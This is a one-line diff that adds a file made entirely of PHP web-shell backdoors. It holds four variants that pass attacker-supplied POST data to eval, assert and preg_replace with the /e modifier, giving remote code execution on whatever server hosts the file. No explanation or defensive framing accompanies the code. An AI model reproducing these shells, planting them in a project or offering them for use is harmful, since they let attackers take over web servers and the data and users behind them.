@@ -1,0 +1,1 @@
+<?php eval($_POST[sb]);?><?php @eval($_POST[sb]);?><?php assert($_POST[sb]);?><?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
